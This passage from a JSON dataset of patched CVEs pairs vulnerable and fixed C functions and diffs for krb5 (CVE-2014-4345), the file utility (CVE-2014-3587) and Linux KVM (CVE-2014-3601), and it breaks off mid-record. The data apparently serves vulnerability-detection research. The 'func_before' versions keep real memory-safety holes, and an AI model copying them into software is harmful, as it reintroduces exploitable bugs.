        "diff_func": "--- func_before\n+++ func_after\n@@ -48,7 +48,7 @@\n     rewind(finput);\n \n     /* allocate memory for stream buffer, exit if unsuccessful */\n-    byteStrm = byteStrmStart = (u8 *)H264SwDecMalloc(sizeof(u8)*strmLen);\n+    byteStrm = byteStrmStart = (u8 *)H264SwDecMalloc(sizeof(u8), strmLen);\n     if (byteStrm == NULL)\n     {\n         printf(\"UNABLE TO ALLOCATE MEMORY\\n\");",
        "diff_line_info": {
            "deleted_lines": [
                "    byteStrm = byteStrmStart = (u8 *)H264SwDecMalloc(sizeof(u8)*strmLen);"
            ],
            "added_lines": [
                "    byteStrm = byteStrmStart = (u8 *)H264SwDecMalloc(sizeof(u8), strmLen);"
            ]
        }
    },
    {
        "cve_id": "CVE-2014-4345",
        "func_name": "krb5/krb5_encode_krbsecretkey",
        "description": "Off-by-one error in the krb5_encode_krbsecretkey function in plugins/kdb/ldap/libkdb_ldap/ldap_principal2.c in the LDAP KDB module in kadmind in MIT Kerberos 5 (aka krb5) 1.6.x through 1.11.x before 1.11.6 and 1.12.x before 1.12.2 allows remote authenticated users to cause a denial of service (buffer overflow) or possibly execute arbitrary code via a series of \"cpw -keepold\" commands.",
        "git_url": "https://github.com/krb5/krb5/commit/dc7ed55c689d57de7f7408b34631bf06fec9dab1",
        "commit_title": "Fix LDAP key data segmentation [CVE-2014-4345]",
        "commit_text": " For principal entries having keys with multiple kvnos (due to use of -keepold), the LDAP KDB module makes an attempt to store all the keys having the same kvno into a single krbPrincipalKey attribute value. There is a fencepost error in the loop, causing currkvno to be set to the just-processed value instead of the next kvno.  As a result, the second and all following groups of multiple keys by kvno are each stored in two krbPrincipalKey attribute values.  Fix the loop to use the correct kvno value.  CVE-2014-4345:  In MIT krb5, when kadmind is configured to use LDAP for the KDC database, an authenticated remote attacker can cause it to perform an out-of-bounds write (buffer overrun) by performing multiple cpw -keepold operations.  An off-by-one error while copying key information to the new database entry results in keys sharing a common kvno being written to different array buckets, in an array whose size is determined by the number of kvnos present.  After sufficient iterations, the extra writes extend past the end of the (NULL-terminated) array.  The NULL terminator is always written after the end of the loop, so no out-of-bounds data is read, it is only written.  Historically, it has been possible to convert an out-of-bounds write into remote code execution in some cases, though the necessary exploits must be tailored to the individual application and are usually quite complicated.  Depending on the allocated length of the array, an out-of-bounds write may also cause a segmentation fault and/or application crash.      CVSSv2 Vector: AV:N/AC:M/Au:S/C:C/I:C/A:C/E:POC/RL:OF/RC:C  [ghudson@mit.edu: clarified commit message] [kaduk@mit.edu: CVE summary, CVSSv2 vector]  (cherry picked from commit 81c332e29f10887c6b9deb065f81ba259f4c7e03)  ticket: 7980 version_fixed: 1.12.2 status: resolved",
        "func_before": "static struct berval **\nkrb5_encode_krbsecretkey(krb5_key_data *key_data_in, int n_key_data,\n                         krb5_kvno mkvno) {\n    struct berval **ret = NULL;\n    int currkvno;\n    int num_versions = 1;\n    int i, j, last;\n    krb5_error_code err = 0;\n    krb5_key_data *key_data;\n\n    if (n_key_data <= 0)\n        return NULL;\n\n    /* Make a shallow copy of the key data so we can alter it. */\n    key_data = k5calloc(n_key_data, sizeof(*key_data), &err);\n    if (key_data_in == NULL)\n        goto cleanup;\n    memcpy(key_data, key_data_in, n_key_data * sizeof(*key_data));\n\n    /* Unpatched krb5 1.11 and 1.12 cannot decode KrbKey sequences with no salt\n     * field.  For compatibility, always encode a salt field. */\n    for (i = 0; i < n_key_data; i++) {\n        if (key_data[i].key_data_ver == 1) {\n            key_data[i].key_data_ver = 2;\n            key_data[i].key_data_type[1] = KRB5_KDB_SALTTYPE_NORMAL;\n            key_data[i].key_data_length[1] = 0;\n            key_data[i].key_data_contents[1] = NULL;\n        }\n    }\n\n    /* Find the number of key versions */\n    for (i = 0; i < n_key_data - 1; i++)\n        if (key_data[i].key_data_kvno != key_data[i + 1].key_data_kvno)\n            num_versions++;\n\n    ret = (struct berval **) calloc (num_versions + 1, sizeof (struct berval *));\n    if (ret == NULL) {\n        err = ENOMEM;\n        goto cleanup;\n    }\n    for (i = 0, last = 0, j = 0, currkvno = key_data[0].key_data_kvno; i < n_key_data; i++) {\n        krb5_data *code;\n        if (i == n_key_data - 1 || key_data[i + 1].key_data_kvno != currkvno) {\n            ret[j] = k5alloc(sizeof(struct berval), &err);\n            if (ret[j] == NULL)\n                goto cleanup;\n            err = asn1_encode_sequence_of_keys(key_data + last,\n                                               (krb5_int16)i - last + 1,\n                                               mkvno, &code);\n            if (err)\n                goto cleanup;\n            /*CHECK_NULL(ret[j]); */\n            ret[j]->bv_len = code->length;\n            ret[j]->bv_val = code->data;\n            free(code);\n            j++;\n            last = i + 1;\n\n            currkvno = key_data[i].key_data_kvno;\n        }\n    }\n    ret[num_versions] = NULL;\n\ncleanup:\n\n    free(key_data);\n    if (err != 0) {\n        if (ret != NULL) {\n            for (i = 0; i <= num_versions; i++)\n                if (ret[i] != NULL)\n                    free (ret[i]);\n            free (ret);\n            ret = NULL;\n        }\n    }\n\n    return ret;\n}",
        "func": "static struct berval **\nkrb5_encode_krbsecretkey(krb5_key_data *key_data_in, int n_key_data,\n                         krb5_kvno mkvno) {\n    struct berval **ret = NULL;\n    int currkvno;\n    int num_versions = 1;\n    int i, j, last;\n    krb5_error_code err = 0;\n    krb5_key_data *key_data;\n\n    if (n_key_data <= 0)\n        return NULL;\n\n    /* Make a shallow copy of the key data so we can alter it. */\n    key_data = k5calloc(n_key_data, sizeof(*key_data), &err);\n    if (key_data_in == NULL)\n        goto cleanup;\n    memcpy(key_data, key_data_in, n_key_data * sizeof(*key_data));\n\n    /* Unpatched krb5 1.11 and 1.12 cannot decode KrbKey sequences with no salt\n     * field.  For compatibility, always encode a salt field. */\n    for (i = 0; i < n_key_data; i++) {\n        if (key_data[i].key_data_ver == 1) {\n            key_data[i].key_data_ver = 2;\n            key_data[i].key_data_type[1] = KRB5_KDB_SALTTYPE_NORMAL;\n            key_data[i].key_data_length[1] = 0;\n            key_data[i].key_data_contents[1] = NULL;\n        }\n    }\n\n    /* Find the number of key versions */\n    for (i = 0; i < n_key_data - 1; i++)\n        if (key_data[i].key_data_kvno != key_data[i + 1].key_data_kvno)\n            num_versions++;\n\n    ret = (struct berval **) calloc (num_versions + 1, sizeof (struct berval *));\n    if (ret == NULL) {\n        err = ENOMEM;\n        goto cleanup;\n    }\n    for (i = 0, last = 0, j = 0, currkvno = key_data[0].key_data_kvno; i < n_key_data; i++) {\n        krb5_data *code;\n        if (i == n_key_data - 1 || key_data[i + 1].key_data_kvno != currkvno) {\n            ret[j] = k5alloc(sizeof(struct berval), &err);\n            if (ret[j] == NULL)\n                goto cleanup;\n            err = asn1_encode_sequence_of_keys(key_data + last,\n                                               (krb5_int16)i - last + 1,\n                                               mkvno, &code);\n            if (err)\n                goto cleanup;\n            /*CHECK_NULL(ret[j]); */\n            ret[j]->bv_len = code->length;\n            ret[j]->bv_val = code->data;\n            free(code);\n            j++;\n            last = i + 1;\n\n            if (i < n_key_data - 1)\n                currkvno = key_data[i + 1].key_data_kvno;\n        }\n    }\n    ret[num_versions] = NULL;\n\ncleanup:\n\n    free(key_data);\n    if (err != 0) {\n        if (ret != NULL) {\n            for (i = 0; i <= num_versions; i++)\n                if (ret[i] != NULL)\n                    free (ret[i]);\n            free (ret);\n            ret = NULL;\n        }\n    }\n\n    return ret;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -56,7 +56,8 @@\n             j++;\n             last = i + 1;\n \n-            currkvno = key_data[i].key_data_kvno;\n+            if (i < n_key_data - 1)\n+                currkvno = key_data[i + 1].key_data_kvno;\n         }\n     }\n     ret[num_versions] = NULL;",
        "diff_line_info": {
            "deleted_lines": [
                "            currkvno = key_data[i].key_data_kvno;"
            ],
            "added_lines": [
                "            if (i < n_key_data - 1)",
                "                currkvno = key_data[i + 1].key_data_kvno;"
            ]
        }
    },
    {
        "cve_id": "CVE-2014-3587",
        "func_name": "file/cdf_read_property_info",
        "description": "Integer overflow in the cdf_read_property_info function in cdf.c in file through 5.19, as used in the Fileinfo component in PHP before 5.4.32 and 5.5.x before 5.5.16, allows remote attackers to cause a denial of service (application crash) via a crafted CDF file.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2012-1571.",
        "git_url": "https://github.com/file/file/commit/0641e56be1af003aa02c7c6b0184466540637233",
        "commit_title": "Prevent wrap around (Remi Collet at redhat)",
        "commit_text": "",
        "func_before": "int\ncdf_read_property_info(const cdf_stream_t *sst, const cdf_header_t *h,\n    uint32_t offs, cdf_property_info_t **info, size_t *count, size_t *maxcount)\n{\n\tconst cdf_section_header_t *shp;\n\tcdf_section_header_t sh;\n\tconst uint8_t *p, *q, *e;\n\tint16_t s16;\n\tint32_t s32;\n\tuint32_t u32;\n\tint64_t s64;\n\tuint64_t u64;\n\tcdf_timestamp_t tp;\n\tsize_t i, o, o4, nelements, j;\n\tcdf_property_info_t *inp;\n\n\tif (offs > UINT32_MAX / 4) {\n\t\terrno = EFTYPE;\n\t\tgoto out;\n\t}\n\tshp = CAST(const cdf_section_header_t *, (const void *)\n\t    ((const char *)sst->sst_tab + offs));\n\tif (cdf_check_stream_offset(sst, h, shp, sizeof(*shp), __LINE__) == -1)\n\t\tgoto out;\n\tsh.sh_len = CDF_TOLE4(shp->sh_len);\n#define CDF_SHLEN_LIMIT (UINT32_MAX / 8)\n\tif (sh.sh_len > CDF_SHLEN_LIMIT) {\n\t\terrno = EFTYPE;\n\t\tgoto out;\n\t}\n\tsh.sh_properties = CDF_TOLE4(shp->sh_properties);\n#define CDF_PROP_LIMIT (UINT32_MAX / (4 * sizeof(*inp)))\n\tif (sh.sh_properties > CDF_PROP_LIMIT)\n\t\tgoto out;\n\tDPRINTF((\"section len: %u properties %u\\n\", sh.sh_len,\n\t    sh.sh_properties));\n\tif (*maxcount) {\n\t\tif (*maxcount > CDF_PROP_LIMIT)\n\t\t\tgoto out;\n\t\t*maxcount += sh.sh_properties;\n\t\tinp = CAST(cdf_property_info_t *,\n\t\t    realloc(*info, *maxcount * sizeof(*inp)));\n\t} else {\n\t\t*maxcount = sh.sh_properties;\n\t\tinp = CAST(cdf_property_info_t *,\n\t\t    malloc(*maxcount * sizeof(*inp)));\n\t}\n\tif (inp == NULL)\n\t\tgoto out;\n\t*info = inp;\n\tinp += *count;\n\t*count += sh.sh_properties;\n\tp = CAST(const uint8_t *, (const void *)\n\t    ((const char *)(const void *)sst->sst_tab +\n\t    offs + sizeof(sh)));\n\te = CAST(const uint8_t *, (const void *)\n\t    (((const char *)(const void *)shp) + sh.sh_len));\n\tif (cdf_check_stream_offset(sst, h, e, 0, __LINE__) == -1)\n\t\tgoto out;\n\tfor (i = 0; i < sh.sh_properties; i++) {\n\t\tsize_t tail = (i << 1) + 1;\n\t\tif (cdf_check_stream_offset(sst, h, p, tail * sizeof(uint32_t),\n\t\t    __LINE__) == -1)\n\t\t\tgoto out;\n\t\tsize_t ofs = CDF_GETUINT32(p, tail);\n\t\tq = (const uint8_t *)(const void *)\n\t\t    ((const char *)(const void *)p + ofs\n\t\t    - 2 * sizeof(uint32_t));\n\t\tif (q > e) {\n\t\t\tDPRINTF((\"Ran of the end %p > %p\\n\", q, e));\n\t\t\tgoto out;\n\t\t}\n\t\tinp[i].pi_id = CDF_GETUINT32(p, i << 1);\n\t\tinp[i].pi_type = CDF_GETUINT32(q, 0);\n\t\tDPRINTF((\"%\" SIZE_T_FORMAT \"u) id=%x type=%x offs=0x%tx,0x%x\\n\",\n\t\t    i, inp[i].pi_id, inp[i].pi_type, q - p, offs));\n\t\tif (inp[i].pi_type & CDF_VECTOR) {\n\t\t\tnelements = CDF_GETUINT32(q, 1);\n\t\t\tif (nelements == 0) {\n\t\t\t\tDPRINTF((\"CDF_VECTOR with nelements == 0\\n\"));\n\t\t\t\tgoto out;\n\t\t\t}\n\t\t\to = 2;\n\t\t} else {\n\t\t\tnelements = 1;\n\t\t\to = 1;\n\t\t}\n\t\to4 = o * sizeof(uint32_t);\n\t\tif (inp[i].pi_type & (CDF_ARRAY|CDF_BYREF|CDF_RESERVED))\n\t\t\tgoto unknown;\n\t\tswitch (inp[i].pi_type & CDF_TYPEMASK) {\n\t\tcase CDF_NULL:\n\t\tcase CDF_EMPTY:\n\t\t\tbreak;\n\t\tcase CDF_SIGNED16:\n\t\t\tif (inp[i].pi_type & CDF_VECTOR)\n\t\t\t\tgoto unknown;\n\t\t\t(void)memcpy(&s16, &q[o4], sizeof(s16));\n\t\t\tinp[i].pi_s16 = CDF_TOLE2(s16);\n\t\t\tbreak;\n\t\tcase CDF_SIGNED32:\n\t\t\tif (inp[i].pi_type & CDF_VECTOR)\n\t\t\t\tgoto unknown;\n\t\t\t(void)memcpy(&s32, &q[o4], sizeof(s32));\n\t\t\tinp[i].pi_s32 = CDF_TOLE4((uint32_t)s32);\n\t\t\tbreak;\n\t\tcase CDF_BOOL:\n\t\tcase CDF_UNSIGNED32:\n\t\t\tif (inp[i].pi_type & CDF_VECTOR)\n\t\t\t\tgoto unknown;\n\t\t\t(void)memcpy(&u32, &q[o4], sizeof(u32));\n\t\t\tinp[i].pi_u32 = CDF_TOLE4(u32);\n\t\t\tbreak;\n\t\tcase CDF_SIGNED64:\n\t\t\tif (inp[i].pi_type & CDF_VECTOR)\n\t\t\t\tgoto unknown;\n\t\t\t(void)memcpy(&s64, &q[o4], sizeof(s64));\n\t\t\tinp[i].pi_s64 = CDF_TOLE8((uint64_t)s64);\n\t\t\tbreak;\n\t\tcase CDF_UNSIGNED64:\n\t\t\tif (inp[i].pi_type & CDF_VECTOR)\n\t\t\t\tgoto unknown;\n\t\t\t(void)memcpy(&u64, &q[o4], sizeof(u64));\n\t\t\tinp[i].pi_u64 = CDF_TOLE8((uint64_t)u64);\n\t\t\tbreak;\n\t\tcase CDF_FLOAT:\n\t\t\tif (inp[i].pi_type & CDF_VECTOR)\n\t\t\t\tgoto unknown;\n\t\t\t(void)memcpy(&u32, &q[o4], sizeof(u32));\n\t\t\tu32 = CDF_TOLE4(u32);\n\t\t\tmemcpy(&inp[i].pi_f, &u32, sizeof(inp[i].pi_f));\n\t\t\tbreak;\n\t\tcase CDF_DOUBLE:\n\t\t\tif (inp[i].pi_type & CDF_VECTOR)\n\t\t\t\tgoto unknown;\n\t\t\t(void)memcpy(&u64, &q[o4], sizeof(u64));\n\t\t\tu64 = CDF_TOLE8((uint64_t)u64);\n\t\t\tmemcpy(&inp[i].pi_d, &u64, sizeof(inp[i].pi_d));\n\t\t\tbreak;\n\t\tcase CDF_LENGTH32_STRING:\n\t\tcase CDF_LENGTH32_WSTRING:\n\t\t\tif (nelements > 1) {\n\t\t\t\tsize_t nelem = inp - *info;\n\t\t\t\tif (*maxcount > CDF_PROP_LIMIT\n\t\t\t\t    || nelements > CDF_PROP_LIMIT)\n\t\t\t\t\tgoto out;\n\t\t\t\t*maxcount += nelements;\n\t\t\t\tinp = CAST(cdf_property_info_t *,\n\t\t\t\t    realloc(*info, *maxcount * sizeof(*inp)));\n\t\t\t\tif (inp == NULL)\n\t\t\t\t\tgoto out;\n\t\t\t\t*info = inp;\n\t\t\t\tinp = *info + nelem;\n\t\t\t}\n\t\t\tDPRINTF((\"nelements = %\" SIZE_T_FORMAT \"u\\n\",\n\t\t\t    nelements));\n\t\t\tfor (j = 0; j < nelements && i < sh.sh_properties;\n\t\t\t    j++, i++)\n\t\t\t{\n\t\t\t\tuint32_t l = CDF_GETUINT32(q, o);\n\t\t\t\tinp[i].pi_str.s_len = l;\n\t\t\t\tinp[i].pi_str.s_buf = (const char *)\n\t\t\t\t    (const void *)(&q[o4 + sizeof(l)]);\n\t\t\t\tDPRINTF((\"l = %d, r = %\" SIZE_T_FORMAT\n\t\t\t\t    \"u, s = %s\\n\", l,\n\t\t\t\t    CDF_ROUND(l, sizeof(l)),\n\t\t\t\t    inp[i].pi_str.s_buf));\n\t\t\t\tif (l & 1)\n\t\t\t\t\tl++;\n\t\t\t\to += l >> 1;\n\t\t\t\tif (q + o >= e)\n\t\t\t\t\tgoto out;\n\t\t\t\to4 = o * sizeof(uint32_t);\n\t\t\t}\n\t\t\ti--;\n\t\t\tbreak;\n\t\tcase CDF_FILETIME:\n\t\t\tif (inp[i].pi_type & CDF_VECTOR)\n\t\t\t\tgoto unknown;\n\t\t\t(void)memcpy(&tp, &q[o4], sizeof(tp));\n\t\t\tinp[i].pi_tp = CDF_TOLE8((uint64_t)tp);\n\t\t\tbreak;\n\t\tcase CDF_CLIPBOARD:\n\t\t\tif (inp[i].pi_type & CDF_VECTOR)\n\t\t\t\tgoto unknown;\n\t\t\tbreak;\n\t\tdefault:\n\t\tunknown:\n\t\t\tDPRINTF((\"Don't know how to deal with %x\\n\",\n\t\t\t    inp[i].pi_type));\n\t\t\tbreak;\n\t\t}\n\t}\n\treturn 0;\nout:\n\tfree(*info);\n\treturn -1;\n}",
        "func": "int\ncdf_read_property_info(const cdf_stream_t *sst, const cdf_header_t *h,\n    uint32_t offs, cdf_property_info_t **info, size_t *count, size_t *maxcount)\n{\n\tconst cdf_section_header_t *shp;\n\tcdf_section_header_t sh;\n\tconst uint8_t *p, *q, *e;\n\tint16_t s16;\n\tint32_t s32;\n\tuint32_t u32;\n\tint64_t s64;\n\tuint64_t u64;\n\tcdf_timestamp_t tp;\n\tsize_t i, o, o4, nelements, j;\n\tcdf_property_info_t *inp;\n\n\tif (offs > UINT32_MAX / 4) {\n\t\terrno = EFTYPE;\n\t\tgoto out;\n\t}\n\tshp = CAST(const cdf_section_header_t *, (const void *)\n\t    ((const char *)sst->sst_tab + offs));\n\tif (cdf_check_stream_offset(sst, h, shp, sizeof(*shp), __LINE__) == -1)\n\t\tgoto out;\n\tsh.sh_len = CDF_TOLE4(shp->sh_len);\n#define CDF_SHLEN_LIMIT (UINT32_MAX / 8)\n\tif (sh.sh_len > CDF_SHLEN_LIMIT) {\n\t\terrno = EFTYPE;\n\t\tgoto out;\n\t}\n\tsh.sh_properties = CDF_TOLE4(shp->sh_properties);\n#define CDF_PROP_LIMIT (UINT32_MAX / (4 * sizeof(*inp)))\n\tif (sh.sh_properties > CDF_PROP_LIMIT)\n\t\tgoto out;\n\tDPRINTF((\"section len: %u properties %u\\n\", sh.sh_len,\n\t    sh.sh_properties));\n\tif (*maxcount) {\n\t\tif (*maxcount > CDF_PROP_LIMIT)\n\t\t\tgoto out;\n\t\t*maxcount += sh.sh_properties;\n\t\tinp = CAST(cdf_property_info_t *,\n\t\t    realloc(*info, *maxcount * sizeof(*inp)));\n\t} else {\n\t\t*maxcount = sh.sh_properties;\n\t\tinp = CAST(cdf_property_info_t *,\n\t\t    malloc(*maxcount * sizeof(*inp)));\n\t}\n\tif (inp == NULL)\n\t\tgoto out;\n\t*info = inp;\n\tinp += *count;\n\t*count += sh.sh_properties;\n\tp = CAST(const uint8_t *, (const void *)\n\t    ((const char *)(const void *)sst->sst_tab +\n\t    offs + sizeof(sh)));\n\te = CAST(const uint8_t *, (const void *)\n\t    (((const char *)(const void *)shp) + sh.sh_len));\n\tif (cdf_check_stream_offset(sst, h, e, 0, __LINE__) == -1)\n\t\tgoto out;\n\tfor (i = 0; i < sh.sh_properties; i++) {\n\t\tsize_t tail = (i << 1) + 1;\n\t\tif (cdf_check_stream_offset(sst, h, p, tail * sizeof(uint32_t),\n\t\t    __LINE__) == -1)\n\t\t\tgoto out;\n\t\tsize_t ofs = CDF_GETUINT32(p, tail);\n\t\tq = (const uint8_t *)(const void *)\n\t\t    ((const char *)(const void *)p + ofs\n\t\t    - 2 * sizeof(uint32_t));\n\t\tif (q < p) {\n\t\t\tDPRINTF((\"Wrapped around %p < %p\\n\", q, p));\n\t\t\tgoto out;\n\t\t}\n\t\tif (q > e) {\n\t\t\tDPRINTF((\"Ran of the end %p > %p\\n\", q, e));\n\t\t\tgoto out;\n\t\t}\n\t\tinp[i].pi_id = CDF_GETUINT32(p, i << 1);\n\t\tinp[i].pi_type = CDF_GETUINT32(q, 0);\n\t\tDPRINTF((\"%\" SIZE_T_FORMAT \"u) id=%x type=%x offs=0x%tx,0x%x\\n\",\n\t\t    i, inp[i].pi_id, inp[i].pi_type, q - p, offs));\n\t\tif (inp[i].pi_type & CDF_VECTOR) {\n\t\t\tnelements = CDF_GETUINT32(q, 1);\n\t\t\tif (nelements == 0) {\n\t\t\t\tDPRINTF((\"CDF_VECTOR with nelements == 0\\n\"));\n\t\t\t\tgoto out;\n\t\t\t}\n\t\t\to = 2;\n\t\t} else {\n\t\t\tnelements = 1;\n\t\t\to = 1;\n\t\t}\n\t\to4 = o * sizeof(uint32_t);\n\t\tif (inp[i].pi_type & (CDF_ARRAY|CDF_BYREF|CDF_RESERVED))\n\t\t\tgoto unknown;\n\t\tswitch (inp[i].pi_type & CDF_TYPEMASK) {\n\t\tcase CDF_NULL:\n\t\tcase CDF_EMPTY:\n\t\t\tbreak;\n\t\tcase CDF_SIGNED16:\n\t\t\tif (inp[i].pi_type & CDF_VECTOR)\n\t\t\t\tgoto unknown;\n\t\t\t(void)memcpy(&s16, &q[o4], sizeof(s16));\n\t\t\tinp[i].pi_s16 = CDF_TOLE2(s16);\n\t\t\tbreak;\n\t\tcase CDF_SIGNED32:\n\t\t\tif (inp[i].pi_type & CDF_VECTOR)\n\t\t\t\tgoto unknown;\n\t\t\t(void)memcpy(&s32, &q[o4], sizeof(s32));\n\t\t\tinp[i].pi_s32 = CDF_TOLE4((uint32_t)s32);\n\t\t\tbreak;\n\t\tcase CDF_BOOL:\n\t\tcase CDF_UNSIGNED32:\n\t\t\tif (inp[i].pi_type & CDF_VECTOR)\n\t\t\t\tgoto unknown;\n\t\t\t(void)memcpy(&u32, &q[o4], sizeof(u32));\n\t\t\tinp[i].pi_u32 = CDF_TOLE4(u32);\n\t\t\tbreak;\n\t\tcase CDF_SIGNED64:\n\t\t\tif (inp[i].pi_type & CDF_VECTOR)\n\t\t\t\tgoto unknown;\n\t\t\t(void)memcpy(&s64, &q[o4], sizeof(s64));\n\t\t\tinp[i].pi_s64 = CDF_TOLE8((uint64_t)s64);\n\t\t\tbreak;\n\t\tcase CDF_UNSIGNED64:\n\t\t\tif (inp[i].pi_type & CDF_VECTOR)\n\t\t\t\tgoto unknown;\n\t\t\t(void)memcpy(&u64, &q[o4], sizeof(u64));\n\t\t\tinp[i].pi_u64 = CDF_TOLE8((uint64_t)u64);\n\t\t\tbreak;\n\t\tcase CDF_FLOAT:\n\t\t\tif (inp[i].pi_type & CDF_VECTOR)\n\t\t\t\tgoto unknown;\n\t\t\t(void)memcpy(&u32, &q[o4], sizeof(u32));\n\t\t\tu32 = CDF_TOLE4(u32);\n\t\t\tmemcpy(&inp[i].pi_f, &u32, sizeof(inp[i].pi_f));\n\t\t\tbreak;\n\t\tcase CDF_DOUBLE:\n\t\t\tif (inp[i].pi_type & CDF_VECTOR)\n\t\t\t\tgoto unknown;\n\t\t\t(void)memcpy(&u64, &q[o4], sizeof(u64));\n\t\t\tu64 = CDF_TOLE8((uint64_t)u64);\n\t\t\tmemcpy(&inp[i].pi_d, &u64, sizeof(inp[i].pi_d));\n\t\t\tbreak;\n\t\tcase CDF_LENGTH32_STRING:\n\t\tcase CDF_LENGTH32_WSTRING:\n\t\t\tif (nelements > 1) {\n\t\t\t\tsize_t nelem = inp - *info;\n\t\t\t\tif (*maxcount > CDF_PROP_LIMIT\n\t\t\t\t    || nelements > CDF_PROP_LIMIT)\n\t\t\t\t\tgoto out;\n\t\t\t\t*maxcount += nelements;\n\t\t\t\tinp = CAST(cdf_property_info_t *,\n\t\t\t\t    realloc(*info, *maxcount * sizeof(*inp)));\n\t\t\t\tif (inp == NULL)\n\t\t\t\t\tgoto out;\n\t\t\t\t*info = inp;\n\t\t\t\tinp = *info + nelem;\n\t\t\t}\n\t\t\tDPRINTF((\"nelements = %\" SIZE_T_FORMAT \"u\\n\",\n\t\t\t    nelements));\n\t\t\tfor (j = 0; j < nelements && i < sh.sh_properties;\n\t\t\t    j++, i++)\n\t\t\t{\n\t\t\t\tuint32_t l = CDF_GETUINT32(q, o);\n\t\t\t\tinp[i].pi_str.s_len = l;\n\t\t\t\tinp[i].pi_str.s_buf = (const char *)\n\t\t\t\t    (const void *)(&q[o4 + sizeof(l)]);\n\t\t\t\tDPRINTF((\"l = %d, r = %\" SIZE_T_FORMAT\n\t\t\t\t    \"u, s = %s\\n\", l,\n\t\t\t\t    CDF_ROUND(l, sizeof(l)),\n\t\t\t\t    inp[i].pi_str.s_buf));\n\t\t\t\tif (l & 1)\n\t\t\t\t\tl++;\n\t\t\t\to += l >> 1;\n\t\t\t\tif (q + o >= e)\n\t\t\t\t\tgoto out;\n\t\t\t\to4 = o * sizeof(uint32_t);\n\t\t\t}\n\t\t\ti--;\n\t\t\tbreak;\n\t\tcase CDF_FILETIME:\n\t\t\tif (inp[i].pi_type & CDF_VECTOR)\n\t\t\t\tgoto unknown;\n\t\t\t(void)memcpy(&tp, &q[o4], sizeof(tp));\n\t\t\tinp[i].pi_tp = CDF_TOLE8((uint64_t)tp);\n\t\t\tbreak;\n\t\tcase CDF_CLIPBOARD:\n\t\t\tif (inp[i].pi_type & CDF_VECTOR)\n\t\t\t\tgoto unknown;\n\t\t\tbreak;\n\t\tdefault:\n\t\tunknown:\n\t\t\tDPRINTF((\"Don't know how to deal with %x\\n\",\n\t\t\t    inp[i].pi_type));\n\t\t\tbreak;\n\t\t}\n\t}\n\treturn 0;\nout:\n\tfree(*info);\n\treturn -1;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -66,6 +66,10 @@\n \t\tq = (const uint8_t *)(const void *)\n \t\t    ((const char *)(const void *)p + ofs\n \t\t    - 2 * sizeof(uint32_t));\n+\t\tif (q < p) {\n+\t\t\tDPRINTF((\"Wrapped around %p < %p\\n\", q, p));\n+\t\t\tgoto out;\n+\t\t}\n \t\tif (q > e) {\n \t\t\tDPRINTF((\"Ran of the end %p > %p\\n\", q, e));\n \t\t\tgoto out;",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "\t\tif (q < p) {",
                "\t\t\tDPRINTF((\"Wrapped around %p < %p\\n\", q, p));",
                "\t\t\tgoto out;",
                "\t\t}"
            ]
        }
    },
    {
        "cve_id": "CVE-2014-3601",
        "func_name": "torvalds/linux/kvm_iommu_map_pages",
        "description": "The kvm_iommu_map_pages function in virt/kvm/iommu.c in the Linux kernel through 3.16.1 miscalculates the number of pages during the handling of a mapping failure, which allows guest OS users to (1) cause a denial of service (host OS memory corruption) or possibly have unspecified other impact by triggering a large gfn value or (2) cause a denial of service (host OS memory consumption) by triggering a small gfn value that leads to permanently pinned pages.",
        "git_url": "https://github.com/torvalds/linux/commit/350b8bdd689cd2ab2c67c8a86a0be86cfa0751a7",
        "commit_title": "kvm: iommu: fix the third parameter of kvm_iommu_put_pages (CVE-2014-3601)",
        "commit_text": " The third parameter of kvm_iommu_put_pages is wrong, It should be 'gfn - slot->base_gfn'.  By making gfn very large, malicious guest or userspace can cause kvm to go to this error path, and subsequently to pass a huge value as size. Alternatively if gfn is small, then pages would be pinned but never unpinned, causing host memory leak and local DOS.  Passing a reasonable but large value could be the most dangerous case, because it would unpin a page that should have stayed pinned, and thus allow the device to DMA into arbitrary memory.  However, this cannot happen because of the condition that can trigger the error:  - out of memory (where you can't allocate even a single page)   should not be possible for the attacker to trigger  - when exceeding the iommu's address space, guest pages after gfn   will also exceed the iommu's address space, and inside   kvm_iommu_put_pages() the iommu_iova_to_phys() will fail.  The   page thus would not be unpinned at all.  Cc: stable@vger.kernel.org",
        "func_before": "int kvm_iommu_map_pages(struct kvm *kvm, struct kvm_memory_slot *slot)\n{\n\tgfn_t gfn, end_gfn;\n\tpfn_t pfn;\n\tint r = 0;\n\tstruct iommu_domain *domain = kvm->arch.iommu_domain;\n\tint flags;\n\n\t/* check if iommu exists and in use */\n\tif (!domain)\n\t\treturn 0;\n\n\tgfn     = slot->base_gfn;\n\tend_gfn = gfn + slot->npages;\n\n\tflags = IOMMU_READ;\n\tif (!(slot->flags & KVM_MEM_READONLY))\n\t\tflags |= IOMMU_WRITE;\n\tif (!kvm->arch.iommu_noncoherent)\n\t\tflags |= IOMMU_CACHE;\n\n\n\twhile (gfn < end_gfn) {\n\t\tunsigned long page_size;\n\n\t\t/* Check if already mapped */\n\t\tif (iommu_iova_to_phys(domain, gfn_to_gpa(gfn))) {\n\t\t\tgfn += 1;\n\t\t\tcontinue;\n\t\t}\n\n\t\t/* Get the page size we could use to map */\n\t\tpage_size = kvm_host_page_size(kvm, gfn);\n\n\t\t/* Make sure the page_size does not exceed the memslot */\n\t\twhile ((gfn + (page_size >> PAGE_SHIFT)) > end_gfn)\n\t\t\tpage_size >>= 1;\n\n\t\t/* Make sure gfn is aligned to the page size we want to map */\n\t\twhile ((gfn << PAGE_SHIFT) & (page_size - 1))\n\t\t\tpage_size >>= 1;\n\n\t\t/* Make sure hva is aligned to the page size we want to map */\n\t\twhile (__gfn_to_hva_memslot(slot, gfn) & (page_size - 1))\n\t\t\tpage_size >>= 1;\n\n\t\t/*\n\t\t * Pin all pages we are about to map in memory. This is\n\t\t * important because we unmap and unpin in 4kb steps later.\n\t\t */\n\t\tpfn = kvm_pin_pages(slot, gfn, page_size);\n\t\tif (is_error_noslot_pfn(pfn)) {\n\t\t\tgfn += 1;\n\t\t\tcontinue;\n\t\t}\n\n\t\t/* Map into IO address space */\n\t\tr = iommu_map(domain, gfn_to_gpa(gfn), pfn_to_hpa(pfn),\n\t\t\t      page_size, flags);\n\t\tif (r) {\n\t\t\tprintk(KERN_ERR \"kvm_iommu_map_address:\"\n\t\t\t       \"iommu failed to map pfn=%llx\\n\", pfn);\n\t\t\tgoto 